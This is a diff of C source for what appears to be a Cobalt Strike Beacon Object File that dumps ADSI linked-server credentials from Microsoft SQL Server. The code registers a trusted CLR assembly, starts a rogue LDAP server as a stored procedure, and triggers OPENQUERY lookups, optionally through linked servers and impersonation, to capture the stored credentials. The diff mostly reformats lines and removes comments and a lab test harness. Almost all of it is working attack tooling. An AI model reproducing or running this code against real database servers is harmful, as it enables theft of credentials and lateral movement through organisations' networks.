@@ -6,7 +6,6 @@
 #include "sql_modules.c"
 #include <pthread.h>
 
-
 typedef struct ThreadData {
   SQLHSTMT stmt;
   char *function;
@@ -22,9 +21,7 @@ void *RunThreadedQuery(LPVOID threadData) {
   char *middle = "(";
   char *suffix = ");";
 
-  size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(data->function) +
-                     MSVCRT$strlen(middle) + MSVCRT$strlen(data->port) +
-                     MSVCRT$strlen(suffix) + 1;
+  size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(data->function) + MSVCRT$strlen(middle) + MSVCRT$strlen(data->port) + MSVCRT$strlen(suffix) + 1;
   char *query = (char *)intAlloc(totalSize);
 
   MSVCRT$strcpy(query, prefix);
@@ -33,14 +30,12 @@ void *RunThreadedQuery(LPVOID threadData) {
   MSVCRT$strncat(query, data->port, totalSize - MSVCRT$strlen(query) - 1);
   MSVCRT$strncat(query, suffix, totalSize - MSVCRT$strlen(query) - 1);
 
-  HandleQuery(data->stmt, (SQLCHAR *)query, data->link, data->impersonate,
-              FALSE);
+  HandleQuery(data->stmt, (SQLCHAR *)query, data->link, data->impersonate, FALSE);
 
   intFree(query);
 }
 
-void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
-                   char *adsiServer, char *port, char *user, char *password) {
+void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate, char *adsiServer, char *port, char *user, char *password) {
   SQLHENV env = NULL;
   SQLHSTMT stmt = NULL;
   SQLHDBC dbc = NULL;
@@ -70,25 +65,17 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
   }
 
   if (link == NULL) {
-    internal_printf("[*] Obtaining ADSI credentials for \"%s\" on %s\n\n",
-                    adsiServer, server);
+    internal_printf("[*] Obtaining ADSI credentials for \"%s\" on %s\n\n", adsiServer, server);
   } else {
-    internal_printf(
-        "[*] Obtaining ADSI credentials for \"%s\" on %s via %s\n\n",
-        adsiServer, link, server);
+    internal_printf( "[*] Obtaining ADSI credentials for \"%s\" on %s via %s\n\n", adsiServer, link, server);
   }
-  //
-  // allocate statement handle
-  //
+
   ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Failed to allocate statement handle\n");
     goto END;
   }
 
-  //
-  // verify that xp_cmdshell is enabled
-  //
   if (IsModuleEnabled(stmt, "clr enabled", link, impersonate)) {
     internal_printf("[*] CLR is enabled\n");
   } else {
@@ -96,18 +83,12 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
     goto END;
   }
 
-  //
-  // close the cursor
-  //
   ret = ODBC32$SQLCloseCursor(stmt);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Failed to close cursor\n");
     goto END;
   }
 
-  //
-  // if using linked server, ensure rpc is enabled
-  //
   if (link != NULL) {
     if (IsRpcEnabled(stmt, link)) {
       internal_printf("[*] RPC out is enabled\n");
@@ -116,9 +97,6 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
       goto END;
     }
 
-    //
-    // close the cursor
-    //
     ret = ODBC32$SQLCloseCursor(stmt);
     if (!SQL_SUCCEEDED(ret)) {
       internal_printf("[!] Failed to close cursor\n");
@@ -126,18 +104,10 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
     }
   }
 
-  //
-  // Check if the assembly hash already exists in sys.trusted_assemblies
-  // and drop it if it does
-  //
   if (AssemblyHashExists(stmt, LDAP_DLL_HASH, link, impersonate)) {
-    internal_printf(
-        "[!] Assembly hash already exists in sys.trusted_assesmblies\n");
+    internal_printf( "[!] Assembly hash already exists in sys.trusted_assesmblies\n");
     internal_printf("[*] Dropping existing assembly hash before continuing\n");
 
-    //
-    // Close the cursor
-    //
     ret = ODBC32$SQLCloseCursor(stmt);
     if (!SQL_SUCCEEDED(ret)) {
       internal_printf("[!] Failed to close cursor\n");
@@ -149,9 +119,6 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
       goto END;
     }
   } else {
-    //
-    // Close the cursor
-    //
     ret = ODBC32$SQLCloseCursor(stmt);
     if (!SQL_SUCCEEDED(ret)) {
       internal_printf("[!] Failed to close cursor\n");
@@ -159,90 +126,47 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
     }
   }
 
-  //
-  // Add the DLL to sys.trusted_assemblies
-  //
   if (!AddTrustedAssembly(stmt, dllPath, LDAP_DLL_HASH, link, impersonate)) {
     internal_printf("[!] Failed to add trusted assembly\n");
     goto END;
   }
 
-  internal_printf("[*] Added SHA-512 hash for DLL to sys.trusted_assemblies "
-                  "with the name \"%s\"\n",
-                  dllPath);
+  internal_printf("[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name \"%s\"\n", dllPath);
 
-  //
-  // Ensure procedure and assembly names do not already exist
-  //
-  if (!DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link,
-                                      impersonate)) {
+  if (!DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate)) {
     internal_printf("[!] Failed to drop existing assembly and procedure\n");
     goto END;
   }
 
-  //
-  // Create the custom assembly
-  //
-  internal_printf(
-      "[*] Creating new LDAP server assembly with the name \"%s\"\n",
-      assemblyName);
+  internal_printf( "[*] Creating new LDAP server assembly with the name \"%s\"\n", assemblyName);
   CreateAssembly(stmt, assemblyName, LDAP_DLL_BYTES, link, impersonate);
 
-  //
-  // Verify that the assembly exists before we continue
-  //
   if (!AssemblyExists(stmt, assemblyName, link, impersonate)) {
     internal_printf("[!] Failed to create custom assembly\n");
     internal_printf("[*] Cleaning up...\n");
     DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
-    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link,
-                                   impersonate);
+    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
     goto END;
   }
 
-  //
-  // Create the stored procedure
-  //
-  internal_printf("[*] Loading LDAP server assembly into a new CLR runtime "
-                  "routine \"%s\"\n",
-                  function);
-  CreateAssemblyStoredProc(stmt, assemblyName, function, TRUE, link,
-                           impersonate);
+  internal_printf("[*] Loading LDAP server assembly into a new CLR runtime routine \"%s\"\n", function);
+  CreateAssemblyStoredProc(stmt, assemblyName, function, TRUE, link, impersonate);
 
-  //
-  // Clear the cursor
-  //
   ClearCursor(stmt);
 
-  //
-  // Verify that the stored procedure exists before we continue
-  //
-  if (!AssemblyFunctionExists(stmt, "ldapAssembly.LdapSrv", link,
-                              impersonate)) {
-    internal_printf("[!] Unable to load LDAP server assembly into custom CLR "
-                    "runtime routine\n");
+  if (!AssemblyFunctionExists(stmt, "ldapAssembly.LdapSrv", link, impersonate)) {
+    internal_printf("[!] Unable to load LDAP server assembly into custom CLR runtime routine\n");
     internal_printf("[*] Cleaning up...\n");
     DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
-    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link,
-                                   impersonate);
+    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
     goto END;
   }
 
-  internal_printf("[*] Created \"[%s].[ldapAssembly.LdapSrv].[%s]\"\n",
-                  assemblyName, function);
+  internal_printf("[*] Created \"[%s].[ldapAssembly.LdapSrv].[%s]\"\n", assemblyName, function);
 
-  //
-  // Clear the cursor
-  //
   ClearCursor(stmt);
 
-  //
-  // Now things get interesting, need to create a second connection
-  // and execute a blocking query in a new thread
-  // while we trigger auth in the main thread
-  //
-  internal_printf("[*] Creating a second connection to the SQL server for "
-                  "threaded query\n");
+  internal_printf("[*] Creating a second connection to the SQL server for threaded query\n");
   if (link == NULL) {
     dbc2 = ConnectToSqlServerAuth(&env2, server, database, user, password);
   } else {
@@ -253,51 +177,36 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
     internal_printf("[!] Failed to create second connection\n");
     internal_printf("[*] Cleaning up...\n");
     DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
-    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link,
-                                   impersonate);
+    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
     goto END;
   }
 
-  //
-  // Allocate a second statement handle
-  //
   ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc2, &stmt2);
   if (!SQL_SUCCEEDED(ret)) {
     internal_printf("[!] Failed to allocate second statement handle\n");
     goto END;
   }
 
-  //
-  // Start the blocking LDAP server query in a new thread
-  //
   internal_printf("[*] Starting a local LDAP server on port %s\n", port);
   ThreadData data = {stmt2, function, port, link, impersonate};
 
-  HANDLE hThread =
-      KERNEL32$CreateThread(NULL, 0, (void *)RunThreadedQuery, &data, 0, NULL);
+  HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (void *)RunThreadedQuery, &data, 0, NULL);
   if (hThread == NULL) {
     internal_printf("[!] Failed to create new thread\n");
     internal_printf("[*] Cleaning up...\n");
     DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
-    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link,
-                                   impersonate);
+    DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
     goto END;
   }
 
-  //
-  // Trigger auth
-  //
-  internal_printf(
-      "[*] Executing LDAP solication (this will fire some errors)...\n\n");
+  internal_printf( "[*] Executing LDAP solication (this will fire some errors)...\n\n");
 
   if (link == NULL) {
     char *part1 = "SELECT * FROM OPENQUERY(\"";
     char *part2 = "\", 'SELECT * FROM ''LDAP://localhost:";
     char *part3 = "''')";
 
-    size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(adsiServer) +
-                       MSVCRT$strlen(part2) + MSVCRT$strlen(port) +
-                       MSVCRT$strlen(part3) + 1;
+    size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(adsiServer) + MSVCRT$strlen(part2) + MSVCRT$strlen(port) + MSVCRT$strlen(part3) + 1;
     trigger = (char *)intAlloc(totalSize);
 
     MSVCRT$strcpy(trigger, part1);
@@ -306,18 +215,12 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
     MSVCRT$strncat(trigger, port, totalSize - MSVCRT$strlen(trigger) - 1);
     MSVCRT$strncat(trigger, part3, totalSize - MSVCRT$strlen(trigger) - 1);
   } else {
-    //
-    // disgusting.
-    //
     char *part1 = "SELECT * FROM OPENQUERY(\"";
     char *part2 = "\", 'SELECT * FROM OPENQUERY(\"";
     char *part3 = "\", ''SELECT * FROM ''''LDAP://localhost:";
     char *part4 = "'''''')')";
 
-    size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(link) +
-                       MSVCRT$strlen(part2) + MSVCRT$strlen(adsiServer) +
-                       MSVCRT$strlen(part3) + MSVCRT$strlen(port) +
-                       MSVCRT$strlen(part4) + 1;
+    size_t totalSize = MSVCRT$strlen(part1) + MSVCRT$strlen(link) + MSVCRT$strlen(part2) + MSVCRT$strlen(adsiServer) + MSVCRT$strlen(part3) + MSVCRT$strlen(port) + MSVCRT$strlen(part4) + 1;
     trigger = (char *)intAlloc(totalSize);
 
     MSVCRT$strcpy(trigger, part1);
@@ -332,22 +235,15 @@ void DumpAdsiCreds(char *server, char *database, char *link, char *impersonate,
   HandleQuery(stmt, (SQLCHAR *)trigger, NULL, impersonate, FALSE);
   HandleQuery(stmt, (SQLCHAR *)trigger, NULL, impersonate, FALSE);
 
-  //
-  // Wait for the thread to finish
-  //
   KERNEL32$WaitForSingleObject(hThread, INFINITE);
   KERNEL32$CloseHandle(hThread);
 
   internal_printf("\n[*] LDAP server thread finished\n\n");
   PrintQueryResults(stmt2, TRUE);
 
-  //
-  // Cleanup before we exit
-  //
   internal_printf("\n[*] Cleaning up...\n");
   DeleteTrustedAssembly(stmt, LDAP_DLL_HASH, link, impersonate);
-  DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link,
-                                 impersonate);
+  DeleteTrustedAssemblyResources(stmt, assemblyName, function, TRUE, link, impersonate);
 
 END:
   intFree(dllPath);
@@ -362,7 +258,6 @@ END:
     DisconnectSqlServer(env2, dbc2, stmt2);
 }
 
-#ifdef BOF
 VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *server;
   char *database;
@@ -373,9 +268,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
   char *user;
   char *password;
 
-  //
-  // parse beacon args
-  //
   datap parser;
   BeaconDataParse(&parser, Buffer, Length);
   server = BeaconDataExtract(&parser, NULL);
@@ -402,25 +294,6 @@ VOID go(IN PCHAR Buffer, IN ULONG Length) {
     return;
   }
 
-  DumpAdsiCreds(server, database, link, impersonate, adsiServer, port, user,
-                password);
+  DumpAdsiCreds(server, database, link, impersonate, adsiServer, port, user, password);
   printoutput(TRUE);
 };
-
-#else
-
-int main() {
-  internal_printf("============ BASE TEST ============\n\n");
-  DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, NULL,
-                "ADSIr", "4444", NULL, NULL);
-
-  internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
-  DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", NULL, "sa",
-                "ADSIr", "4444", NULL, NULL);
-
-  internal_printf("\n\n============ LINK TEST ============\n\n");
-  DumpAdsiCreds("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS",
-                NULL, "ADSIEssos", "4444", NULL, NULL);
-}
-
-#endif
